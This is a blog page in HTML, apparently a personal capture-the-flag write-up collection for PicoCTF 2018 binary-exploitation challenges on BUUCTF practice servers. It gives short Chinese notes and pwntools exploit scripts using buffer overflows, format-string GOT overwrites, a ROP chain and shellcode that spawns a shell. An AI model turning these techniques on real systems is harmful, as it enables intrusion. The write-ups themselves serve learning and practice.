@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8" /><title>PureWeb Blog</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepo/github.css"><link rel="stylesheet" href="/TestRepo/speciou.css"></head>
+<body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo/">Joe1sn&apos;s Blog</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepo/archives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<p><strong>2021-3-5 9:51</strong></p>
+<p>buu上的合集</p>
+<!-- more -->
+<h1>are_you_root</h1>
+<ul>
+<li>验证码未初始化，第一次覆盖下一次的验证码后，下一次验证码为上一次覆盖</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_are_you_root&quot;)
+sh = remote(&quot;node3.buuoj.cn&quot;,&quot;27788&quot;)
+
+def login(name):
+	sh.sendlineafter(&quot;&gt; &quot;,&quot;login &quot;+name)
+
+def reset():
+	sh.sendlineafter(&quot;&gt; &quot;,&quot;reset&quot;)
+
+def get_flag():
+	sh.sendlineafter(&quot;&gt; &quot;,&quot;get-flag&quot;)
+
+if __name__ == '__main__':
+	login('a'*0x8+p64(0x5))
+	reset()
+	login(&quot;joe1sn&quot;)
+	get_flag()
+	print sh.recv(50)
+</code></pre>
+<h1>authenticate</h1>
+<ul>
+<li>字符串格式化漏洞修改 <strong>authenticated</strong> 的值</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_authenticate&quot;)
+#sh = process(&quot;./PicoCTF_2018_authenticate&quot;)
+sh = remote(&quot;node3.buuoj.cn&quot;,&quot;26278&quot;)
+
+target_addr = 0x0804A04C
+payload = fmtstr_payload(11,{target_addr:0x000000001})
+sh.sendlineafter(&quot;(yes/no)\n&quot;,payload)
+sh.recvuntil(&quot;Access Granted.\n&quot;)
+print sh.recv(0x30)
+</code></pre>
+<h1>buffer_overflow_0</h1>
+<ul>
+<li>strcpy溢出，接收参数溢出过后，自动打印出flag</li>
+</ul>
+<h1>buffer_overflow_1</h1>
+<ul>
+<li>gets溢出</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level=  &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_buffer_overflow_1&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;25355&quot;)
+
+paylaod = &quot;a&quot;*(0x28+4)
+paylaod += p32(elf.sym[&quot;win&quot;])
+
+p.sendlineafter(&quot;Please enter your string: \n&quot;,paylaod)
+p.interactive()
+</code></pre>
+<h1>buffer_overflow_2</h1>
+<ul>
+<li>gets溢出+libc leak</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+context.log_level= &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_buffer_overflow_2&quot;)
+#p  =process(&quot;./PicoCTF_2018_buffer_overflow_2&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;25896&quot;)
+
+puts_got = elf.got[&quot;puts&quot;]
+puts_plt = elf.plt[&quot;puts&quot;]
+vuln_addr = 0x08048646
+win = elf.sym[&quot;win&quot;]
+
+payload = &quot;a&quot;*(0x6c+4)
+payload += p32(win)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
+p.sendline(payload)
+p.interactive()
+#payload += p32(puts_plt)+p32(vuln_addr)+p32(puts_got)
+'''
+p.sendline(payload)
+
+puts_real = u32(p.recv(4))
+libc = LibcSearcher(&quot;puts&quot;,puts_real)
+base = puts_real - libc.dump(&quot;puts&quot;)
+
+sys_addr = base + libc.dump(&quot;system&quot;)
+binsh = base + libc.dump(&quot;str_bin_sh&quot;)
+
+payload = 'a'*(0x6c+4)
+payload += p32(sys_addr)+p32(0)+p32(binsh)
+p.sendline(payload)
+p.interactive()
+'''
+</code></pre>
+<h1>buffer_overflow_3</h1>
+<p>爆破canary文件，然后rop</p>
+<p>虚拟机崩了，原来的exp.py找不回来了，这个网上随便找一个就行</p>
+<h1>can_you_gets_me</h1>
+<ul>
+<li>gets溢出+rop链自动生成</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+from struct import pack
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_can-you-gets-me&quot;)
+sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29149&quot;)
+
+p = 'a'*(0x18+4)
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080b81c6) # pop eax ; ret
+p += '/bin'
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea064) # @ .data + 4
+p += pack('&lt;I', 0x080b81c6) # pop eax ; ret
+p += '//sh'
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049303) # xor eax, eax ; ret
+p += pack('&lt;I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080de955) # pop ecx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x0806f02a) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049303) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0807a86f) # inc eax ; ret
+p += pack('&lt;I', 0x0806cc25) # int 0x80
+
+sh.sendlineafter(&quot;NAME!\n&quot;,p)
+sh.interactive()
+</code></pre>
+<h1>echo_back</h1>
+<ul>
+<li>字符串格式化漏洞，覆盖puts为vuln，然后继续操作</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_echo_back&quot;)
+#sh = process(&quot;./PicoCTF_2018_echo_back&quot;)
+sh = remote(&quot;node3.buuoj.cn&quot;,&quot;27050&quot;)
+
+vuln = 0x080485AB
+payload = fmtstr_payload(7,{elf.got[&quot;puts&quot;]:vuln})
+sh.sendlineafter(&quot;input your message:\n&quot;,payload)
+
+leak_payload = p32(elf.got[&quot;system&quot;])+'%7$s'
+sh.send(leak_payload)
+sh.recvuntil('input your message:\n')
+system_addr = u32(sh.recvuntil('\xf7')[-4:])
+success(&quot;system addr -&gt; &quot;+hex(system_addr))
+
+payload = fmtstr_payload(7,{elf.got[&quot;printf&quot;]:system_addr})
+sh.send(payload)
+
+sh.sendline(&quot;/bin/sh\x00&quot;)
+sh.interactive()
+</code></pre>
+<h1>echooo</h1>
+<ul>
+<li>字符串格式化漏洞，导致被读取在stream的flag文件被读取</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_echooo&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;29044&quot;)
+p.sendlineafter(&quot;&gt; &quot; , &quot;%8$s&quot;)
+p.interactive()
+</code></pre>
+<h1>got_shell</h1>
+<ul>
+<li>交换puts函数的got为后门函数</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level= &quot;debug&quot;
+elf = ELF(&quot;./PicoCTF_2018_got-shell&quot;)
+#p  = process(&quot;./PicoCTF_2018_got-shell&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;27340&quot;)
+puts_got = hex(elf.got[&quot;puts&quot;])
+win = hex(elf.sym[&quot;win&quot;])
+
+p.sendlineafter(&quot;4 byte value?\n&quot;,puts_got)
+p.sendlineafter(&quot;\n&quot;,win)
+
+p.interactive()
+</code></pre>
+<h1>gps</h1>
+<ul>
+<li>程序会跳转到一个地址，然后执行</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+context.arch=&quot;amd64&quot;
+#p = process(&quot;./picoctf_2018_gps&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;26522&quot;)
+
+p.recvuntil(&quot;Current position: 0x&quot;)
+rc = int(p.recv(12),16)
+stack  = rc + 0x29c +0x520
+info(&quot;stack -&gt; 0x%x&quot;,stack)
+p.sendlineafter(&quot;&gt; &quot;,asm(shellcraft.sh()).rjust(0x1000-20,&quot;\x90&quot;))
+p.sendlineafter(&quot;&gt; &quot;,hex(rc))
+p.interactive()
+#p.sendlineafter(&quot;&gt; &quot;,p64(stack))
+</code></pre>
+<h1>leak_me</h1>
+<ul>
+<li>读取password.txt的栈刚好在fgets后面，通过填充leak password.txt的内容后，输入password得到flag</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+#p = process(&quot;./PicoCTF_2018_leak-me&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;27898&quot;)
+p.sendafter(&quot;What is your name?&quot; , &quot;a&quot; * (0x100 - 1))
+p.recvuntil(&quot;a&quot; * 0xff + &quot;,&quot;)
+password = p.recvuntil(&quot;\n&quot;)
+p.sendline(password)
+p.interactive()
+</code></pre>
+<h1>rop_chain</h1>
+<ul>
+<li>溢出过后，64位使用寄存器传参，填入参数满足后门函数就好</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;27583&quot;)
+#p = process(&quot;./PicoCTF_2018_rop_chain&quot;)
+elf = ELF('./PicoCTF_2018_rop_chain')
+
+func1 = 0x080485CB
+func2 = 0x080485d8
+flag = 0x0804862B
+pop_ret = 0x080485d6
+buf = 'a'*0x18
+
+payload = buf + 'aaaa'
+payload += p32(func1)+p32(pop_ret) + p32(0)
+payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD)
+payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD)
+
+p.recvuntil('&gt;')
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h1>shellcode</h1>
+<ul>
+<li>程序可以执行刚才输入的代码，直接填入shellcode</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;25260&quot;)
+
+shellcode = asm(shellcraft.sh())
+p.sendlineafter(&quot;Enter a string!\n&quot;,shellcode)
+p.interactive()
+</code></pre>
+
+</div>
+</div></body></html>
